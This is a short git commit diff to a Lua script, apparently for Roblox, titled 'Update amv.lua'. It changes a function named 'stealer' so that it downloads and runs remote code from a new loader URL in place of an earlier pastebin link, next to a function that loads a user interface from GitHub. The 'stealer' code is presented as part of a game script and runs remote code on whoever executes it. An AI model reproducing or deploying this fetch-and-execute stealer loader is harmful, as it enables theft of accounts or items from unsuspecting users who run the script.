87b60524948a546544e987e77f09250ff920b17e
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-08-31 00:28:46 +0500

    Update amv.lua

--- primordial/script/amv.lua
+++ primordial/script/amv.lua
@@ -1,5 +1,6 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastebin.com/raw/3QWiJtxQ"))()
+ID="0d0a40e9-48e9-45da-94c2-c75a58369eb9";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
 local function loadui()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/script.lua"))()
